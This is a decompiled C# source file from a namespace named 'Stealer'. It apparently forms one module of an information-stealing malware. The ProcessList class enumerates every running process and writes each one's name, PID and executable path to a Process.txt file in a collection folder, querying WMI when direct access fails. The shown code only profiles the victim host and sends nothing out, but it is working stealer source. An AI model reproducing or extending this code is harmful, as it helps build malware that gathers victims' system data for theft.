using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace Stealer;

internal sealed class ProcessList
{
	public static void WriteProcesses(string sSavePath)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			File.AppendAllText(sSavePath + "\\Process.txt", "NAME: " + process.ProcessName + "\n\tPID: " + process.Id + "\n\tEXE: " + ProcessExecutablePath(process) + "\n\n");
		}
	}

	public static string ProcessExecutablePath(Process process)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		try
		{
			return process.MainModule!.FileName;
		}
		catch
		{
			string text = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
			ManagementObjectSearcher val = new ManagementObjectSearcher(text);
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val2).get_Item("ProcessID");
					object obj2 = ((ManagementBaseObject)val2).get_Item("ExecutablePath");
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		return "";
	}
}
